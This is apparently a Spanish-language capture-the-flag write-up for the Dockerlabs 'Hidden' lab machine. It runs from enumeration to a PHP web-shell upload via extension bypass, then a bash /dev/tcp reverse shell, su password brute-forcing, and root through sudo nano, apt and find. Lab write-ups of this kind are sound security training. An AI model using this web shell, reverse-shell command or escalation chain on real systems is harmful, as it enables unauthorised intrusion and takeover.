
# Writeup Template: Maquina `[ HIDDEN ]`

- Tags: #Hidden
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Hidden](https://mega.nz/file/EO8DzKgR#V3Vj8pWT6dUfWP03Zi2ZNs-o3uztnrTd1qGxvnn3oHo)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x hidden.zip
sudo bash auto_deploy.sh hidden.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.52
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio: Tenemos **hostsDiscovery** asi que agregamos a nuestro archivo: **( /etc/hosts )**
```bash
172.17.0.2 hidden.lab
```

```bash
http://hidden.lab/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://hidden.lab/ # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/mail/: Mail folder
/css/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
/img/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
/js/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
/lib/: Potentially interesting directory w/ listing on 'apache/2.4.52 (ubuntu)'
```

### Descubrimiento de Rutas
```bash
gobuster dir -u http://hidden.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/mail/                (Status: 200) [Size: 1370]
/css/                 (Status: 200) [Size: 1133]
/lib/                 (Status: 200) [Size: 1539]
/js/                  (Status: 200) [Size: 923]
/img/                 (Status: 200) [Size: 4245
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://hidden.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,pl
```

- **Hallazgos**:
```bash
/contact.html         (Status: 200) [Size: 11680]
/about.html           (Status: 200) [Size: 9703]
/img                  (Status: 301) [Size: 306] [--> http://hidden.lab/img/]
/index.html           (Status: 200) [Size: 10483]
/mail                 (Status: 301) [Size: 307] [--> http://hidden.lab/mail/]
/menu.html            (Status: 200) [Size: 11846]
/service.html         (Status: 200) [Size: 10926]
/css                  (Status: 301) [Size: 306] [--> http://hidden.lab/css/]
/lib                  (Status: 301) [Size: 306] [--> http://hidden.lab/lib/]
/js                   (Status: 301) [Size: 305] [--> http://hidden.lab/js/]
/LICENSE.txt          (Status: 200) [Size: 1456]
/testimonial.html     (Status: 200) [Size: 10335]
/reservation.html     (Status: 200) [Size: 11786]
```

Enumerando **subdominios** encontramos lo siguiente:
```bash
wfuzz -c --hl=9 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.hidden.lab" -u 172.17.0.2
```

Tenemos un **subdominio** valido
```bash
000000019:   200        57 L     130 W      1653 Ch     "dev"
```

Para que puedamos acceder a este subdominio lo tenemes que volver a agregar a nuestro archivo: **( /etc/hosts )**
```bash
172.17.0.2 dev.hidden.lab
```

Tenemos esta pagina donde podemos subir archivos **PDF**, Si no valida el tipo de archivo tenemos una via potencial de ganar acceso al servidor:
```bash
http://dev.hidden.lab/
```

Lanzamos **burpsuite** para interceptar la **peticion**, Lo primero que aremos es un ataque de externsiones
```bash
burpsuite &>/dev/null & disown
```

Ahora creamos un archivo **php** malicioso: **( cmd.php )**
```php
<?php
  system($_GET["cmd"]);
?>
```

Intentamos subir el archivo e interceptamos la peticion para despues mandarla al modo repeater
**Nota** no tuvimos que realizar tecnicas avanzadas, con esta extension nos permite subirlo
```bash
Content-Disposition: form-data; name="archivo"; filename="cmd.php2"
Content-Type: application/x-php

<?php
  system($_GET["cmd"]);
?>
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que logramos cargar un archivo en el servidor devemos verificar donde es que se cargan para poder acceder a el y poder ejecutralo ya que nos permite realizar una llamada a nivel de sistema para ejecutar un comando.
**Fuzzeando** por directorios encontramos la ruta posible donde se cargan archivos
```bash
gobuster dir -u http://dev.hidden.lab/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Nota** el que se logre subir no quiere decir que se ejecute, Tendremos que pobar hasta que una logre ejecutar codigo **php** y con este funciona
```bash
Content-Disposition: form-data; name="archivo"; filename="cmd.phtml
```

### Ejecucion del Ataque
Logramos ejecucion remota de comandos
```bash
# Comandos para explotación
http://dev.hidden.lab/uploads/cmd.phtml?cmd=whoami
```

### Intrusion
Modo escucha que nos permite ganar aceso al targen
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
http://dev.hidden.lab/uploads/cmd.phtml?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l # No report nada
find / -perm -4000 2>/dev/null # No reporta nada
```

**Hallazgos Clave:**
	No encontramos nada critico en el sistema,

### Explotacion de Privilegios

###### Usuario `[ www-data ]`:
Realizamos un ataque de fuerza bruta a los usuarios del sistema.
Para ello nos transeferimos dos herramientas a la maquina victima, Nos copiamos estas herramientas en nuestro directorio actual de trabajo
```bash
cp /usr/share/wordlists/rockyou.txt .
cp /usr/bin/Sudo_BruteForce/Linux-Su-Force.sh .
```

Ahora nos montamos un servidor con **python**
```bash
python3 -m http.server 80
```

Con el usuario: **( www-data )** en el directorio: **( /tmp )** ya que tiene capacidad de escritura:
Realizamos la peticio para transferirnos las herramientas
**Nota** Descartamos este tipo de subida ya que no esta instalado el comando: **( curl | wget )** en el sistema
Lo que aremos es intentar subirlos desde la web que es vulnerable a subida de archvos
Logramos subir el scripit de sh: **( Linux-Su-Force.sh )** pero el diccionario rockyou es muy grande para poder subirlo asi que lo recortaremos:
**( xcp )** es un alias del comando: **( xclip -sel clip )**
```bash
cat rockyou.txt | head -n 300 | xcp
```

Despues creamos el archivo: **( rockyou_short.txt )** y si que nos ha dejado subirlo en esta ruta del sistema
```bash
/var/www/dev.hidden.lab/uploads
```

Procedemos a ejecutar la herramienta de la siguiente manera:
```bash
chmod +x Linux-Su-Force.sh
```

Revisando los usuarios del sistema tenemos:
```bash
root:x:0:0:root:/root:/bin/bash
cafetero:x:1000:1000::/home/cafetero:/bin/sh
john:x:1001:1001::/home/john:/bin/sh
bobby:x:1002:1002::/home/bobby:/bin/sh
```

Iniciaremos por el usuario: **Cafetero**
```bash
bash Linux-Su-Force.sh cafetero rockyou_short.txt
```

Tenemos la contrasena del usuario **Cafetero**
```bash
Contraseña encontrada para el usuario cafetero: 123123
```

###### Usuario `[ www-data ]`:
Revisando los permisos de este usuario:
```bash
User cafetero may run the following commands on 459dc4bf8948:
    (john) NOPASSWD: /usr/bin/nano
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( john )
sudo -u john /usr/bin/nano
ctrl + R
ctrl + X
reset; sh 1>&0 2>&0
```

###### Usuario `[ john ]`:
Listando los permisos de este usuario:
```bash
User john may run the following commands on 459dc4bf8948:
    (bobby) NOPASSWD: /usr/bin/apt
```

Explotamos el privilegio:
```bash
sudo -u bobby /usr/bin/apt
apt changelog apt
!/bin/sh
```

###### Usuario `[ bobby ]`:
Listando los permisos para este usuario:
```bash
User bobby may run the following commands on 459dc4bf8948:
    (root) NOPASSWD: /usr/bin/find
```

Explotando el privilegio de este usuario:
```bash
sudo -u root /usr/bin/find . -exec /bin/bash -p \; -quit
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@459dc4bf8948:/home/cafetero# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a subir archivos maliciosos al servidor
2. Aprendimos a ejecutar un ataque de extensiones
3. Aprendimos a explotar el binario **find** para obtener una sesion como **root**

## Recomendaciones de Seguridad
- Verificar la subida de archivos